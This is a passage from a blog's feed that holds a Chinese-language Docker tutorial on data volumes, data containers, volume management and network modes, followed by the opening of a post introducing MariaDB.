&#x897F;&#x7684;&#x8BDD;&#xFF0C;docker&#x4F1A;&#x590D;&#x5236;&#x4E00;&#x4EFD;&#x5230;&#x8FD9;&#x4E2A;&#x53EF;&#x8BFB;&#x5199;&#x7684;&#x6587;&#x4EF6;&#x5C42;&#x91CC;&#x9762;&#xFF0C;&#x5982;&#x679C;&#x5220;&#x9664;&#x5BB9;&#x5668;&#x7684;&#x8BDD;&#xFF0C;&#x90A3;&#x4E48;&#x4E5F;&#x4F1A;&#x5220;&#x9664;&#x5B83;&#x5BF9;&#x5E94;&#x7684;&#x53EF;&#x8BFB;&#x5199;&#x7684;&#x6587;&#x4EF6;&#x5C42;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x5982;&#x679C;&#x6709;&#x4E9B;&#x6570;&#x636E;&#x4F60;&#x60F3;&#x4E00;&#x76F4;&#x4FDD;&#x5B58;&#x7684;&#x8BDD;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;web&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x9762;&#x7684;&#x65E5;&#x5FD7;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x91CC;&#x9762;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x628A;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#x653E;&#x5230;data volumes&#x6570;&#x636E;&#x76D8;&#x91CC;&#x9762;&#x3002;&#x5B83;&#x4E0A;&#x9762;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5373;&#x4F7F;&#x628A;&#x5BB9;&#x5668;&#x5220;&#x6389;&#xFF0C;&#x4E5F;&#x8FD8;&#x662F;&#x4F1A;&#x6C38;&#x4E45;&#x4FDD;&#x7559;&#x3002;&#x521B;&#x5EFA;&#x5BB9;&#x5668;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53BB;&#x6307;&#x5B9A;&#x6570;&#x636E;&#x76D8;&#x3002;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x53BB;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x76EE;&#x5F55;&#x3002;</p><pre><code class="shell">docker run -i -t -v /mnt --name nginx docker.io/nginx /bin/bash</code></pre><p><code>-v</code>&#xFF1A;&#x6307;&#x5B9A;&#x6302;&#x8F7D;&#x5230;&#x5BB9;&#x5668;&#x5185;&#x7684;&#x76EE;&#x5F55;<br>&#x4F7F;&#x7528;docker insepect&#x5BB9;&#x5668;ID&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x6302;&#x8F7D;&#x76EE;&#x5F55;&#x5BF9;&#x5E94;&#x4E8E;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x7684;&#x7269;&#x7406;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;<br>&#x540C;&#x6837;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5C06;&#x5236;&#x5B9A;&#x7269;&#x7406;&#x5BBF;&#x4E3B;&#x673A;&#x7684;&#x76EE;&#x5F55;&#x6302;&#x8F7D;&#x5230;&#x5BB9;&#x5668;&#x7684;&#x5236;&#x5B9A;&#x76EE;&#x5F55;&#x4E0B;&#xFF1A;</p><p>&#x5C06;&#x5BBF;&#x4E3B;&#x673A;&#x76EE;&#x5F55;&#x6302;&#x8F7D;&#x5230;&#x5BB9;&#x5668;&#x5185;&#xFF1A;</p><pre><code class="shell">docker run -d -p 80:80 --name nginx -v /webdata/wordpress:/usr/share/nginx/html docker.io/sergyzh/centos6-nginx</code></pre><p><code>-d</code>&#x540E;&#x53F0;&#x8FD0;&#x884C;<br><code>--name</code>&#x7ED9;&#x8FD0;&#x884C;&#x7684;&#x5BB9;&#x5668;&#x547D;&#x540D;<br><code>-v</code>&#x5BBF;&#x4E3B;&#x673A;&#x76EE;&#x5F55;:&#x5BB9;&#x5668;&#x76EE;&#x5F55; &#x5C06;&#x5BBF;&#x4E3B;&#x673A;&#x76EE;&#x5F55;&#x6302;&#x8F7D;&#x5728;&#x5BB9;&#x5668;&#x5185;<br><code>-p</code> &#x5BBF;&#x4E3B;&#x673A;&#x7AEF;&#x53E3;:&#x5BB9;&#x5668;&#x76D1;&#x542C;&#x7AEF;&#x53E3; &#x5C06;&#x5BB9;&#x5668;&#x5185;&#x5E94;&#x7528;&#x76D1;&#x542C;&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x5230;&#x7269;&#x7406;&#x5BBF;&#x4E3B;&#x673A;&#x7684;&#x7279;&#x5B9A;&#x7AEF;&#x53E3;&#x4E0A;</p><p><strong>3.2 &#x6570;&#x636E;&#x5BB9;&#x5668;</strong></p><p>&#x53EF;&#x4EE5;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5BB9;&#x5668;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x518D;&#x521B;&#x5EFA;&#x5BB9;&#x5668;&#x662F;&#x6307;&#x5B9A;&#x8FD9;&#x4E2A;&#x5BB9;&#x5668;&#x7684;&#x6570;&#x636E;&#x76D8;&#xFF0C;&#x7136;&#x540E;&#x8BA9;&#x5176;&#x4ED6;&#x5BB9;&#x5668;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x5BB9;&#x5668;&#x4F5C;&#x4E3A;&#x4ED6;&#x4EEC;&#x7684;&#x6570;&#x636E;&#x76D8;&#xFF0C;&#x6709;&#x70B9;&#x50CF;&#x7EE7;&#x627F;&#x4E86;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#x5BB9;&#x5668;&#x6307;&#x5B9A;&#x7684;&#x6570;&#x636E;&#x76D8;&#x4F5C;&#x4E3A;&#x6570;&#x636E;&#x76D8;&#x3002;</p><p>&#x9996;&#x5148;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5BB9;&#x5668;&#x547D;&#x540D;&#x4E3A;newnginx</p><pre><code class="shell">docker create -v /mnt -it --name newnginx docker.io/nginx /bin/bash</code></pre><p>&#x5229;&#x7528;&#x6B64;&#x6570;&#x636E;&#x5BB9;&#x5668;&#x5BB9;&#x5668;&#x8FD0;&#x884C;&#x4E00;&#x4E2A;&#x5BB9;&#x5668;nginx1,&#x5728;&#x6570;&#x636E;&#x76EE;&#x5F55;/mnt &#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;</p><pre><code class="shell">docker run --volumes-from newnginx --name nginx1 -it docker.io/nginx /bin/bash</code></pre><p>&#x5229;&#x7528;&#x6570;&#x636E;&#x5BB9;&#x5668;&#x5728;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5BB9;&#x5668;nginx2&#xFF0C;&#x67E5;&#x770B;&#x6570;&#x636E;&#x76EE;&#x5F55;&#x4E0B;&#x5BB9;&#x5668;nginx1&#x521B;&#x5EFA;&#x7684;&#x6587;&#x4EF6;&#x4F9D;&#x65E7;&#x5B58;&#x5728;&#xFF0C;&#x540C;&#x7406;&#x5728;nginx2&#x7684;/mnt&#x4E0B;&#x521B;&#x5EFA;&#x6587;&#x4EF6;&#xFF0C;&#x5176;&#x4ED6;&#x57FA;&#x4E8E;&#x6570;&#x636E;&#x5BB9;&#x5668;&#x8FD0;&#x884C;&#x7684;&#x65B0;&#x5BB9;&#x5668;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6587;&#x4EF6;</p><p><strong>3.3 &#x6570;&#x636E;&#x76D8;&#x7BA1;&#x7406;</strong></p><p>&#x5728;&#x5220;&#x9664;&#x5BB9;&#x5668;&#x65F6;&#xFF0C;docker&#x9ED8;&#x8BA4;&#x4E0D;&#x4F1A;&#x5220;&#x9664;&#x5176;&#x6570;&#x636E;&#x76D8;&#x3002;</p><pre><code class="shell">docker volume ls   # &#x67E5;&#x770B;&#x6570;&#x636E;&#x76D8;docker volume ls -f dangling=true    # &#x67E5;&#x770B;&#x672A;&#x88AB;&#x5BB9;&#x5668;&#x4F7F;&#x7528;&#x7684;&#x6570;&#x636E;&#x76D8;docker volume rm VOLUME NAME    # &#x5220;&#x9664;&#x6570;&#x636E;&#x76D8;</code></pre><p>&#x5982;&#x679C;&#x60F3;&#x8981;&#x5220;&#x9664;&#x5BB9;&#x5668;&#x65F6;&#xFF0C;&#x540C;&#x65F6;&#x5220;&#x9664;&#x6389;&#x5176;&#x6570;&#x636E;&#x76D8;&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>-v</code>&#x53C2;&#x6570;&#x3002;</p><pre><code class="shell">docker rm -v newnginx</code></pre><h2 id="&#x56DB;&#x3001;&#x7F51;&#x7EDC;"><a href="#&#x56DB;&#x3001;&#x7F51;&#x7EDC;" class="headerlink" title="&#x56DB;&#x3001;&#x7F51;&#x7EDC;"></a>&#x56DB;&#x3001;&#x7F51;&#x7EDC;</h2><p>docker&#x63D0;&#x4F9B;&#x51E0;&#x79CD;&#x7F51;&#x7EDC;&#xFF0C;&#x5B83;&#x51B3;&#x5B9A;&#x5BB9;&#x5668;&#x4E4B;&#x95F4;&#x548C;&#x5916;&#x754C;&#x548C;&#x5BB9;&#x5668;&#x4E4B;&#x95F4;&#x5982;&#x4F55;&#x53BB;&#x76F8;&#x4E92;&#x901A;&#x4FE1;</p><pre><code class="shell">docker newwork ls  # &#x67E5;&#x770B;&#x7F51;&#x7EDC;</code></pre><p>&#x5F53;Docker&#x8FDB;&#x7A0B;&#x542F;&#x52A8;&#x65F6;&#xFF0C;&#x4F1A;&#x5728;&#x4E3B;&#x673A;&#x4E0A;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;docker0&#x7684;&#x865A;&#x62DF;&#x7F51;&#x6865;&#xFF0C;&#x6B64;&#x4E3B;&#x673A;&#x4E0A;&#x542F;&#x52A8;&#x7684;Docker&#x5BB9;&#x5668;&#x4F1A;&#x8FDE;&#x63A5;&#x5230;&#x8FD9;&#x4E2A;&#x865A;&#x62DF;&#x7F51;&#x6865;&#x4E0A;&#x3002;&#x865A;&#x62DF;&#x7F51;&#x6865;&#x7684;&#x5DE5;&#x4F5C;&#x65B9;&#x5F0F;&#x548C;&#x7269;&#x7406;&#x4EA4;&#x6362;&#x673A;&#x7C7B;&#x4F3C;&#xFF0C;&#x8FD9;&#x6837;&#x4E3B;&#x673A;&#x4E0A;&#x7684;&#x6240;&#x6709;&#x5BB9;&#x5668;&#x5C31;&#x901A;&#x8FC7;&#x4EA4;&#x6362;&#x673A;&#x8FDE;&#x5728;&#x4E86;&#x4E00;&#x4E2A;&#x4E8C;&#x5C42;&#x7F51;&#x7EDC;&#x4E2D;&#x3002;&#x4ECE;docker0&#x5B50;&#x7F51;&#x4E2D;&#x5206;&#x914D;&#x4E00;&#x4E2A;IP&#x7ED9;&#x5BB9;&#x5668;&#x4F7F;&#x7528;&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;docker0&#x7684;IP&#x5730;&#x5740;&#x4E3A;&#x5BB9;&#x5668;&#x7684;&#x9ED8;&#x8BA4;&#x7F51;&#x5173;&#x3002;&#x5728;&#x4E3B;&#x673A;&#x4E0A;&#x521B;&#x5EFA;&#x4E00;&#x5BF9;&#x865A;&#x62DF;&#x7F51;&#x5361;veth pair&#x8BBE;&#x5907;&#xFF0C;Docker&#x5C06;veth pair&#x8BBE;&#x5907;&#x7684;&#x4E00;&#x7AEF;&#x653E;&#x5728;&#x65B0;&#x521B;&#x5EFA;&#x7684;&#x5BB9;&#x5668;&#x4E2D;&#xFF0C;&#x5E76;&#x547D;&#x540D;&#x4E3A;eth0&#xFF08;&#x5BB9;&#x5668;&#x7684;&#x7F51;&#x5361;&#xFF09;&#xFF0C;&#x53E6;&#x4E00;&#x7AEF;&#x653E;&#x5728;&#x4E3B;&#x673A;&#x4E2D;&#xFF0C;&#x4EE5;vethxxx&#x8FD9;&#x6837;&#x7C7B;&#x4F3C;&#x7684;&#x540D;&#x5B57;&#x547D;&#x540D;&#xFF0C;&#x5E76;&#x5C06;&#x8FD9;&#x4E2A;&#x7F51;&#x7EDC;&#x8BBE;&#x5907;&#x52A0;&#x5165;&#x5230;docker0&#x7F51;&#x6865;&#x4E2D;&#x3002;</p><p><strong>4.1 bridge&#x6865;&#x63A5;&#x7F51;&#x7EDC;</strong></p><p>&#x9664;&#x975E;&#x521B;&#x5EFA;&#x5BB9;&#x5668;&#x7684;&#x65F6;&#x5019;&#x6307;&#x5B9A;&#x7F51;&#x7EDC;&#xFF0C;&#x4E0D;&#x7136;&#x5BB9;&#x5668;&#x5C31;&#x4F1A;&#x9ED8;&#x8BA4;&#x7684;&#x4F7F;&#x7528;&#x6865;&#x63A5;&#x7F51;&#x7EDC;&#x3002;&#x5C5E;&#x4E8E;&#x8FD9;&#x4E2A;&#x7F51;&#x7EDC;&#x7684;&#x5BB9;&#x5668;&#x4E4B;&#x95F4;&#x53EF;&#x4EE5;&#x76F8;&#x4E92;&#x901A;&#x4FE1;&#xFF0C;&#x4E0D;&#x8FC7;&#x5916;&#x754C;&#x60F3;&#x8981;&#x8BBF;&#x95EE;&#x5230;&#x8FD9;&#x4E2A;&#x7F51;&#x7EDC;&#x7684;&#x5BB9;&#x5668;&#x5462;&#xFF0C;&#x9700;&#x4F7F;&#x7528;&#x6865;&#x63A5;&#x7F51;&#x7EDC;&#xFF0C;&#x6709;&#x70B9;&#x50CF;&#x4E3B;&#x673A;&#x548C;&#x5BB9;&#x5668;&#x4E4B;&#x95F4;&#x7684;&#x4E00;&#x5EA7;&#x6865;&#xFF0C;&#x5BF9;&#x5BB9;&#x5668;&#x6709;&#x4E00;&#x70B9;&#x9694;&#x79BB;&#x4F5C;&#x7528;&#x3002;&#x5B9E;&#x9645;&#x662F;&#x5728;iptables&#x505A;&#x4E86;DNAT&#x89C4;&#x5219;&#xFF0C;&#x5B9E;&#x73B0;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x529F;&#x80FD;&#x3002;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;iptables -t nat -vnL&#x67E5;&#x770B;&#x3002;</p><p><strong>4.2 host&#x4E3B;&#x673A;&#x7F51;&#x7EDC;</strong></p><p>&#x5982;&#x679C;&#x542F;&#x52A8;&#x5BB9;&#x5668;&#x7684;&#x65F6;&#x5019;&#x4F7F;&#x7528;host&#x6A21;&#x5F0F;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x5BB9;&#x5668;&#x5C06;&#x4E0D;&#x4F1A;&#x83B7;&#x5F97;&#x4E00;&#x4E2A;&#x72EC;&#x7ACB;&#x7684;Network Namespace&#xFF0C;&#x800C;&#x662F;&#x548C;&#x5BBF;&#x4E3B;&#x673A;&#x5171;&#x7528;&#x4E00;&#x4E2A;Network Namespace&#x3002;&#x5BB9;&#x5668;&#x5C06;&#x4E0D;&#x4F1A;&#x865A;&#x62DF;&#x51FA;&#x81EA;&#x5DF1;&#x7684;&#x7F51;&#x5361;&#xFF0C;&#x914D;&#x7F6E;&#x81EA;&#x5DF1;&#x7684;IP&#x7B49;&#xFF0C;&#x800C;&#x662F;&#x4F7F;&#x7528;&#x5BBF;&#x4E3B;&#x673A;&#x7684;IP&#x548C;&#x7AEF;&#x53E3;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x5BB9;&#x5668;&#x7684;&#x5176;&#x4ED6;&#x65B9;&#x9762;&#xFF0C;&#x5982;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3001;&#x8FDB;&#x7A0B;&#x5217;&#x8868;&#x7B49;&#x8FD8;&#x662F;&#x548C;&#x5BBF;&#x4E3B;&#x673A;&#x9694;&#x79BB;&#x7684;&#x3002;&#x53EA;&#x7528;&#x8FD9;&#x79CD;&#x7F51;&#x7EDC;&#x7684;&#x5BB9;&#x5668;&#x4F1A;&#x4F7F;&#x7528;&#x4E3B;&#x673A;&#x7684;&#x7F51;&#x7EDC;&#xFF0C;&#x8FD9;&#x79CD;&#x7F51;&#x7EDC;&#x5BF9;&#x5916;&#x754C;&#x662F;&#x5B8C;&#x5168;&#x5F00;&#x653E;&#x7684;&#xFF0C;&#x80FD;&#x591F;&#x8BBF;&#x95EE;&#x5230;&#x4E3B;&#x673A;&#xFF0C;&#x5C31;&#x80FD;&#x8BBF;&#x95EE;&#x5230;&#x5BB9;&#x5668;&#x3002;</p><p><strong>4.3 &#x4F7F;&#x7528;none&#x6A21;&#x5F0F;</strong></p><p>Docker&#x5BB9;&#x5668;&#x62E5;&#x6709;&#x81EA;&#x5DF1;&#x7684;Network Namespace&#xFF0C;&#x4F46;&#x662F;&#xFF0C;&#x5E76;&#x4E0D;&#x4E3A;Docker&#x5BB9;&#x5668;&#x8FDB;&#x884C;&#x4EFB;&#x4F55;&#x7F51;&#x7EDC;&#x914D;&#x7F6E;&#x3002;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x8FD9;&#x4E2A;Docker&#x5BB9;&#x5668;&#x6CA1;&#x6709;&#x7F51;&#x5361;&#x3001;IP&#x3001;&#x8DEF;&#x7531;&#x7B49;&#x4FE1;&#x606F;&#x3002;&#x9700;&#x8981;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x4E3A;Docker&#x5BB9;&#x5668;&#x6DFB;&#x52A0;&#x7F51;&#x5361;&#x3001;&#x914D;&#x7F6E;IP&#x7B49;&#x3002;&#x4F7F;&#x7528;&#x6B64;&#x79CD;&#x7F51;&#x7EDC;&#x7684;&#x5BB9;&#x5668;&#x4F1A;&#x5B8C;&#x5168;&#x9694;&#x79BB;&#x3002;</p><p><strong>4.4 &#x7B80;&#x5355;&#x6F14;&#x793A;</strong></p><pre><code class="shell">for i in `docker ps | grep -v &quot;CONTAINER&quot; | awk &apos;{print $1}&apos;`; do docker inspect $i | grep &apos;IPAddress&apos;; done</code></pre><p>&#x67E5;&#x770B;&#x6865;&#x63A5;&#x6A21;&#x5F0F;&#x4E0B;&#x4E3B;&#x673A;&#x5185;&#x90E8;&#x5BB9;&#x5668;&#x4E4B;&#x95F4;&#x548C;&#x5BB9;&#x5668;&#x4E0E;&#x5BBF;&#x4E3B;&#x673A;&#x76F4;&#x63A5;&#x5747;&#x53EF;&#x6B63;&#x5E38;&#x901A;&#x4FE1;</p><pre><code class="shell">docker inspect &#x5BB9;&#x5668;ID</code></pre><p>&#x67E5;&#x770B;host&#x521B;&#x5EFA;&#x7684;&#x5BB9;&#x5668;&#x5185;&#x90E8;&#x6CA1;&#x6709;IP&#x5730;&#x5740;&#xFF0C;&#x5B83;&#x4F7F;&#x7528;&#x7684;&#x4E3A;&#x5BBF;&#x4E3B;&#x673A;&#x7684;&#x5730;&#x5740;</p><pre><code class="shell">docker run -d --new host docker.io/sergeyzh/centos-nginx</code></pre><p>&#x67E5;&#x770B;host&#x521B;&#x5EFA;&#x7684;&#x5BB9;&#x5668;&#x5185;&#x90E8;&#x6CA1;&#x6709;IP&#x5730;&#x5740;&#xFF0C;&#x5B83;&#x4F7F;&#x7528;&#x7684;&#x4E3A;&#x5BBF;&#x4E3B;&#x673A;&#x7684;&#x5730;&#x5740;</p><pre><code class="shell">docker run -d --new none docker.io/sergeyzh/centos-nginx</code></pre><p><strong>4.5 &#x5BB9;&#x5668;&#x7AEF;&#x53E3;</strong></p><p>&#x5982;&#x679C;&#x60F3;&#x8BA9;&#x5916;&#x754C;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x5230;&#xFF0C;&#x57FA;&#x4E8E;bridge&#x7F51;&#x7EDC;&#x521B;&#x5EFA;&#x7684;&#x5BB9;&#x5668;&#x63D0;&#x4F9B;&#x7684;&#x670D;&#x52A1;&#xFF0C;&#x90A3;&#x4F60;&#x53EF;&#x4EE5;&#x544A;&#x8BC9;Docker&#x4F60;&#x8981;&#x4F7F;&#x7528;&#x54EA;&#x4E9B;&#x63A5;&#x53E3;&#x3002;&#x5982;&#x679C;&#x60F3;&#x67E5;&#x770B;&#x955C;&#x50CF;&#x4F1A;&#x4F7F;&#x7528;&#x54EA;&#x4E9B;&#x7AEF;&#x53E3;&#xFF0C;ExposedPorts&#xFF0C;&#x53EF;&#x4EE5;&#x83B7;&#x6089;&#x955C;&#x50CF;&#x4F7F;&#x7528;&#x54EA;&#x4E9B;&#x7AEF;&#x53E3;&#x3002;</p><pre><code class="shell">docker run -d -p 80 docker.io/sergeyzh/centos-nginxdocker port 09648b2ff7f6</code></pre><p><code>-p</code> &#x53C2;&#x6570;&#x4F1A;&#x5728;&#x5BBF;&#x4E3B;&#x673A;&#x968F;&#x673A;&#x6620;&#x5C04;&#x4E00;&#x4E2A;&#x9AD8;&#x7AEF;&#x53E3;&#x5230;&#x5BB9;&#x5668;&#x5185;&#x7684;&#x6307;&#x5B9A;&#x7AEF;&#x53E3;</p><pre><code class="shell">docker run -d -p 80:80 docker.io/sergeyzh/centos6-nginx  #&#x5C06;&#x5BBF;&#x4E3B;&#x673A;&#x7684;80&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x5230;&#x5BB9;&#x5668;&#x7684;80&#x7AEF;&#x53E3;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;容器Docker详解&quot;&gt;&lt;a href=&quot;#容器Docker详解&quot; class=&quot;headerlink&quot; title=&quot;容器Docker详解&quot;&gt;&lt;/a&gt;容器Docker详解&lt;/h1&gt;&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1.1 基本概念：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Docker是一个开源的应用容器引擎，基于Go语言 并遵从Apache2.0协议开源。Docker可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的Linux机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口（类似iPhone的app），更重要的的是容器性能开销极低。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MariaDB</title>
    <link href="https://marnm.github.io//posts/fbf617b4/"/>
    <id>https://marnm.github.io//posts/fbf617b4/</id>
    <published>2022-06-07T05:16:21.000Z</published>
    <updated>2022-06-07T05:26:37.960Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x7AE0;&#x8282;&#x7B80;&#x8FF0;"><a href="#&#x7AE0;&#x8282;&#x7B80;&#x8FF0;" class="headerlink" title="&#x7AE0;&#x8282;&#x7B80;&#x8FF0;"></a>&#x7AE0;&#x8282;&#x7B80;&#x8FF0;</h2><p>MySQL&#x6570;&#x636E;&#x5E93;&#x9879;&#x76EE;&#x81EA;&#x4ECE;&#x88AB;Oracle&#x516C;&#x53F8;&#x6536;&#x8D2D;&#x4E4B;&#x540E;&#xFF0C;&#x4ECE;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#x8F6C;&#x53D8;&#x6210;&#x4E3A;&#x4E86;&#x201C;&#x95ED;&#x6E90;&#x201D;&#x8F6F;&#x4EF6;&#xFF0C;&#x8FD9;&#x5BFC;&#x81F4;IT&#x884C;&#x4E1A;&#x4E2D;&#x7684;&#x5F88;&#x591A;&#x4F01;&#x4E1A;&#x4EE5;&#x53CA;&#x5382;&#x5546;&#x7EB7;&#x7EB7;&#x9009;&#x62E9;&#x4F7F;&#x7528;&#x4E86;&#x6570;&#x636E;&#x5E93;&#x8F6F;&#x4EF6;&#x7684;&#x540E;&#x8D77;&#x4E4B;&#x79C0;&#x2014;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x3002;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E5F;&#x56E0;&#x6B64;&#x5FEB;&#x901F;&#x5360;&#x636E;&#x4E86;&#x5E02;&#x573A;&#x3002;<br>&#x672C;&#x7AE0;&#x5C06;&#x4ECB;&#x7ECD;&#x6570;&#x636E;&#x5E93;&#x4EE5;&#x53CA;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x7684;&#x7406;&#x8BBA;&#x77E5;&#x8BC6;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x4ECB;&#x7ECD;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6700;&#x540E;&#x5C06;&#x901A;&#x8FC7;&#x52A8;&#x624B;&#x5B9E;&#x9A8C;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x5E2E;&#x52A9;&#x5404;&#x4F4D;&#x8BFB;&#x8005;&#x638C;&#x63E1;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x7684;&#x4E00;&#x4E9B;&#x5E38;&#x89C4;&#x64CD;&#x4F5C;&#x3002;&#x6BD4;&#x5982;&#xFF0C;&#x8D26;&#x6237;&#x7684;&#x521B;&#x5EFA;&#x4E0E;&#x7BA1;&#x7406;&#x3001;&#x8D26;&#x6237;&#x6743;&#x9650;&#x7684;&#x6388;&#x6743;&#xFF1B;&#x65B0;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x3001;&#x65B0;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x8868;&#x5355;&#xFF1B;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x6267;&#x884C;&#x65B0;&#x5EFA;&#x3001;&#x5220;&#x9664;&#x3001;&#x4FEE;&#x6539;&#x548C;&#x67E5;&#x8BE2;&#x7B49;&#x64CD;&#x4F5C;&#x3002;&#x672C;&#x7AE0;&#x6700;&#x540E;&#x8FD8;&#x4ECB;&#x7ECD;&#x4E86;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;&#x65B9;&#x6CD5;&#x3002;<br>&#x5728;&#x5B66;&#x5B8C;&#x672C;&#x7AE0;&#x5185;&#x5BB9;&#x4E4B;&#x540E;&#xFF0C;&#x4E0D;&#x4F46;&#x53EF;&#x4EE5;&#x80DC;&#x4EFB;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x5DE5;&#x4F5C;&#x3002;</p><h2 id="1-&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;"><a href="#1-&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;" class="headerlink" title="1 &#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;"></a>1 &#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;</h2><p>&#x6570;&#x636E;&#x5E93;&#x662F;&#x6307;&#x6309;&#x7167;&#x67D0;&#x4E9B;&#x7279;&#x5B9A;&#x7ED3;&#x6784;&#x6765;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x8D44;&#x6599;&#x7684;&#x6570;&#x636E;&#x4ED3;&#x5E93;&#x3002;&#x5728;&#x5F53;&#x4ECA;&#x8FD9;&#x4E2A;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x8FC5;&#x901F;&#x5D1B;&#x8D77;&#x7684;&#x5E74;&#x4EE3;&#xFF0C;&#x4E92;&#x8054;&#x7F51;&#x4E0A;&#x6BCF;&#x5929;&#x90FD;&#x4F1A;&#x751F;&#x6210;&#x6D77;&#x91CF;&#x7684;&#x6570;&#x636E;&#x4FE1;&#x606F;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x6280;&#x672F;&#x4E5F;&#x4ECE;&#x6700;&#x521D;&#x53EA;&#x80FD;&#x5B58;&#x50A8;&#x7B80;&#x5355;&#x7684;&#x8868;&#x683C;&#x6570;&#x636E;&#x7684;&#x5355;&#x4E00;&#x96C6;&#x4E2D;&#x5B58;&#x50A8;&#x6A21;&#x5F0F;&#xFF0C;&#x53D1;&#x5C55;&#x5230;&#x4E86;&#x73B0;&#x5982;&#x4ECA;&#x5B58;&#x50A8;&#x6D77;&#x91CF;&#x6570;&#x636E;&#x7684;&#x5927;&#x578B;&#x5206;&#x5E03;&#x5F0F;&#x6A21;&#x5F0F;&#x3002;&#x5728;&#x4FE1;&#x606F;&#x5316;&#x793E;&#x4F1A;&#x4E2D;&#xFF0C;&#x80FD;&#x591F;&#x5145;&#x5206;&#x6709;&#x6548;&#x5730;&#x7BA1;&#x7406;&#x548C;&#x5229;&#x7528;&#x5404;&#x79CD;&#x6570;&#x636E;&#xFF0C;&#x6316;&#x6398;&#x5176;&#x4E2D;&#x7684;&#x4EF7;&#x503C;&#xFF0C;&#x662F;&#x8FDB;&#x884C;&#x79D1;&#x5B66;&#x7814;&#x7A76;&#x4E0E;&#x51B3;&#x7B56;&#x7BA1;&#x7406;&#x7684;&#x91CD;&#x8981;&#x524D;&#x63D0;&#x3002;&#x540C;&#x65F6;&